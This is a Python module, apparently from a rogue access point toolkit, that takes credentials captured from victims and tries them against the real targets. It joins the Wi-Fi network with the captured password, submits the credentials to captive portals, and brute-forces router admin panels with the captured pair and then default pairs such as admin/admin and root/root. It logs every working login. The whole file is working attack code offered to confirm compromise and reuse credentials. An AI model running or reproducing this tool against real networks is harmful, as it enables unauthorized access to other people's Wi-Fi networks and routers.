"""
Credential Auto-Testing
───────────────────────
Attempt captured credentials against the real AP to verify they work.
This confirms successful compromise and allows for credential reuse.

Test types:
1. Wi-Fi password test - connect to AP with captured password
2. HTTP portal test - submit credentials to captive portal
3. Admin panel test - attempt login to router admin interface
"""

import time
import threading
import subprocess
import socket
import base64
from collections import defaultdict
from urllib.parse import urlparse

from .config import log


class CredentialTester:
    """
    Test captured credentials against real targets.

    Supports Wi-Fi password testing via wpa_supplicant on Linux,
    HTTP captive portal credential testing via raw sockets,
    and router admin panel brute-force testing.
    """

    def __init__(self, interface):
        self.interface = interface
        self._results = defaultdict(list)  # (bssid, ssid) -> list of (user, pass, success)
        self._running = False
        self._thread = None
        self._test_results = []  # stores test outcomes

    def add_credentials(self, bssid, ssid, username, password):
        """Add credentials to test queue."""
        self._results[(bssid, ssid)].append((username, password))

    def _http_request(self, host, port, method, path, headers=None,
                      body=None, timeout=10):
        """
        Send an HTTP request using raw sockets and return (status_code, headers, body).
        This avoids needing the requests library.
        """
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))

            # Build request
            request_line = f"{method} {path} HTTP/1.1\r\n"
            default_headers = {
                "Host": host,
                "User-Agent": "Mozilla/5.0 (compatible; CredTester/1.0)",
                "Connection": "close",
            }
            if headers:
                default_headers.update(headers)

            if body:
                if isinstance(body, str):
                    body = body.encode()
                default_headers["Content-Length"] = str(len(body))
                if "Content-Type" not in default_headers:
                    default_headers["Content-Type"] = "application/x-www-form-urlencoded"

            header_str = "".join(f"{k}: {v}\r\n" for k, v in default_headers.items())
            request = (request_line + header_str + "\r\n").encode()
            if body:
                request += body if isinstance(body, bytes) else body.encode()

            sock.sendall(request)

            # Read response
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 65536:
                        break
                except socket.timeout:
                    break

            if not response:
                return None, {}, ""

            # Parse response
            resp_str = response.decode(errors="ignore")
            header_end = resp_str.find("\r\n\r\n")
            if header_end == -1:
                return None, {}, resp_str

            header_section = resp_str[:header_end]
            resp_body = resp_str[header_end + 4:]

            # Parse status line
            lines = header_section.split("\r\n")
            status_line = lines[0] if lines else ""
            status_code = None
            if "HTTP/" in status_line:
                parts = status_line.split(" ", 2)
                if len(parts) >= 2:
                    try:
                        status_code = int(parts[1])
                    except ValueError:
                        status_code = None

            # Parse headers
            resp_headers = {}
            for line in lines[1:]:
                if ":" in line:
                    key, val = line.split(":", 1)
                    resp_headers[key.strip().lower()] = val.strip()

            return status_code, resp_headers, resp_body

        except (socket.error, socket.timeout, OSError) as e:
            log.warning(f"HTTP request failed to {host}:{port}: {e}")
            return None, {}, ""
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

    def test_wifi_password(self, bssid, ssid, password, timeout=15):
        """
        Test Wi-Fi password using wpa_supplicant.
        Returns True if connection succeeds.
        """
        if not password:
            return False

        log.info(f"Testing Wi-Fi password for {ssid} ({bssid})...")

        # Create temporary wpa_supplicant config
        config_path = f"/tmp/wpa_test_{int(time.time())}.conf"
        with open(config_path, "w") as f:
            f.write(f"ctrl_interface=/var/run/wpa_supplicant\n")
            f.write(f"ap_scan=1\n\n")
            f.write(f"network={{\n")
            f.write(f"    ssid=\"{ssid}\"\n")
            f.write(f"    psk=\"{password}\"\n")
            f.write(f"}}\n")

        # Try to connect
        try:
            # Reconfigure interface
            subprocess.run(
                ["iw", "dev", self.interface, "set", "type", "managed"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5
            )
            subprocess.run(
                ["ip", "link", "set", self.interface, "up"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5
            )

            # Start wpa_supplicant
            proc = subprocess.Popen(
                ["wpa_supplicant", "-i", self.interface, "-c", config_path, "-B"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

            # Wait for connection
            for _ in range(timeout):
                result = subprocess.run(
                    ["iwconfig", self.interface],
                    capture_output=True, text=True, timeout=5
                )
                if "IEEE 802.11" in result.stdout and "Not-Associated" not in result.stdout:
                    log.critical(f"Wi-Fi password SUCCESS for {ssid}")
                    proc.terminate()
                    self._test_results.append({
                        "type": "wifi", "ssid": ssid, "bssid": bssid,
                        "success": True, "password": password
                    })
                    return True
                time.sleep(1)

            proc.terminate()
            log.warning(f"Wi-Fi password FAILED for {ssid}")
            self._test_results.append({
                "type": "wifi", "ssid": ssid, "bssid": bssid,
                "success": False, "password": password
            })
            return False

        except Exception as e:
            log.warning(f"Wi-Fi test error for {ssid}: {e}")
            return False
        finally:
            # Cleanup
            try:
                # Only kill wpa_supplicant instances using our test config,
                # not all wpa_supplicant processes (which would break other connections)
                subprocess.run(
                    ["pkill", "-f", f"wpa_supplicant.*{config_path}"],
                    stderr=subprocess.DEVNULL, timeout=5
                )
                import os
                os.remove(config_path)
            except Exception:
                pass

    def test_http_portal(self, bssid, ssid, username, password, url="http://10.0.0.1"):
        """
        Test HTTP portal credentials by POSTing to the captive portal URL.
        Uses socket-level HTTP to submit login form data and checks for
        success indicators in the response (302 redirect, success keywords).
        """
        log.info(f"HTTP portal test for {ssid}: {username}@{url}")

        parsed = urlparse(url)
        host = parsed.hostname or "10.0.0.1"
        port = parsed.port or 80
        path = parsed.path or "/"

        # Build form POST body with common field names
        form_bodies = [
            f"username={username}&password={password}",
            f"user={username}&pass={password}",
            f"login={username}&password={password}",
            f"email={username}&passwd={password}",
        ]

        for form_body in form_bodies:
            status_code, resp_headers, resp_body = self._http_request(
                host, port, "POST", path,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                body=form_body,
                timeout=10
            )

            if status_code is None:
                log.warning(f"Portal unreachable at {url}")
                self._test_results.append({
                    "type": "portal", "ssid": ssid, "bssid": bssid,
                    "success": False, "username": username, "reason": "unreachable"
                })
                return False

            # Check for success indicators
            success = False

            # 302 redirect often indicates successful login
            if status_code in (301, 302, 303):
                location = resp_headers.get("location", "")
                # Redirect to dashboard/home/portal indicates success
                if any(kw in location.lower() for kw in
                       ["dashboard", "home", "portal", "welcome", "success", "index"]):
                    success = True
                # Redirect away from login page is usually success
                elif location and "login" not in location.lower():
                    success = True

            # 200 with success keywords in body
            if status_code == 200:
                body_lower = resp_body.lower()
                success_keywords = ["welcome", "success", "dashboard", "logged in",
                                    "logout", "sign out", "authenticated"]
                failure_keywords = ["invalid", "incorrect", "failed", "wrong",
                                    "error", "denied", "try again"]

                has_success = any(kw in body_lower for kw in success_keywords)
                has_failure = any(kw in body_lower for kw in failure_keywords)

                if has_success and not has_failure:
                    success = True

            if success:
                log.critical(f"Portal credentials VALID: {username}:{password} @ {url}")
                self._test_results.append({
                    "type": "portal", "ssid": ssid, "bssid": bssid,
                    "success": True, "username": username, "password": password
                })
                return True

        log.info(f"Portal credentials INVALID: {username} @ {url}")
        self._test_results.append({
            "type": "portal", "ssid": ssid, "bssid": bssid,
            "success": False, "username": username
        })
        return False

    def test_admin_panel(self, bssid, ssid, username, password, host="192.168.1.1"):
        """
        Test router admin panel credentials by attempting login on common
        admin paths. Tries HTTP Basic authentication and form-based POST
        login. Detects success by checking for 200 status without a login form.
        """
        log.info(f"Admin panel test for {bssid}: {username}@{host}")

        admin_paths = [
            "/admin", "/login", "/management", "/cgi-bin/login",
            "/", "/admin/login", "/login.html", "/admin.html",
            "/cgi-bin/luci", "/webui"
        ]

        # Common credential pairs to try if primary fails
        common_creds = [
            (username, password),  # Supplied credentials first
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "1234"),
            ("root", "root"),
            ("admin", ""),
        ]

        port = 80

        for cred_user, cred_pass in common_creds:
            for path in admin_paths:
                # Try HTTP Basic Auth
                auth_string = base64.b64encode(
                    f"{cred_user}:{cred_pass}".encode()
                ).decode()
                basic_headers = {"Authorization": f"Basic {auth_string}"}

                status_code, resp_headers, resp_body = self._http_request(
                    host, port, "GET", path,
                    headers=basic_headers,
                    timeout=8
                )

                if status_code is None:
                    continue

                # 401 means auth required (credentials wrong)
                if status_code == 401:
                    continue

                # 200 without login form means we are in
                if status_code == 200:
                    body_lower = resp_body.lower()
                    has_login_form = any(kw in body_lower for kw in [
                        "type=\"password\"", "type='password'",
                        "name=\"password\"", "name='password'",
                        "login", "sign in"
                    ])
                    has_admin_content = any(kw in body_lower for kw in [
                        "firmware", "configuration", "settings", "wireless",
                        "dhcp", "firewall", "logout", "reboot", "status",
                        "wan", "lan", "administration"
                    ])

                    if has_admin_content and not has_login_form:
                        log.critical(
                            f"Admin panel ACCESS: {cred_user}:{cred_pass} "
                            f"@ {host}{path}"
                        )
                        self._test_results.append({
                            "type": "admin", "bssid": bssid, "host": host,
                            "path": path, "success": True,
                            "username": cred_user, "password": cred_pass
                        })
                        return True

                # Try form-based POST login
                form_body = f"username={cred_user}&password={cred_pass}"
                status_code, resp_headers, resp_body = self._http_request(
                    host, port, "POST", path,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body=form_body,
                    timeout=8
                )

                if status_code is None:
                    continue

                # Check for redirect to admin area
                if status_code in (301, 302, 303):
                    location = resp_headers.get("location", "").lower()
                    if "login" not in location and location:
                        log.critical(
                            f"Admin panel ACCESS (form): {cred_user}:{cred_pass} "
                            f"@ {host}{path}"
                        )
                        self._test_results.append({
                            "type": "admin", "bssid": bssid, "host": host,
                            "path": path, "success": True,
                            "username": cred_user, "password": cred_pass
                        })
                        return True

                # 200 response after POST - check for admin content
                if status_code == 200:
                    body_lower = resp_body.lower()
                    has_login_form = any(kw in body_lower for kw in [
                        "type=\"password\"", "type='password'",
                        "invalid", "incorrect", "failed", "wrong"
                    ])
                    has_admin_content = any(kw in body_lower for kw in [
                        "firmware", "configuration", "settings",
                        "wireless", "logout", "status"
                    ])
                    if has_admin_content and not has_login_form:
                        log.critical(
                            f"Admin panel ACCESS (form): {cred_user}:{cred_pass} "
                            f"@ {host}{path}"
                        )
                        self._test_results.append({
                            "type": "admin", "bssid": bssid, "host": host,
                            "path": path, "success": True,
                            "username": cred_user, "password": cred_pass
                        })
                        return True

        log.info(f"Admin panel test FAILED for {host}")
        self._test_results.append({
            "type": "admin", "bssid": bssid, "host": host,
            "success": False, "username": username
        })
        return False

    def run_tests(self):
        """Run all credential tests in background."""
        self._running = True
        for (bssid, ssid), creds in self._results.items():
            for username, password in creds:
                if not self._running:
                    break
                # Test Wi-Fi password first (most common)
                success = self.test_wifi_password(bssid, ssid, password)
                if success:
                    log.critical(f"[SUCCESS] {ssid} - Password cracked: {password}")

    def start(self):
        """Start credential testing in background thread."""
        if self._running:
            return
        self._thread = threading.Thread(target=self.run_tests, daemon=True)
        self._thread.start()

    def stop(self):
        """Stop credential testing."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)

    def get_results(self):
        """Return all test results."""
        return self._test_results

    def get_stats(self):
        """Return credential testing statistics."""
        total = sum(len(c) for c in self._results.values())
        successes = sum(1 for r in self._test_results if r.get("success"))
        return {
            "total_credentials": total,
            "tests_run": len(self._test_results),
            "successes": successes
        }
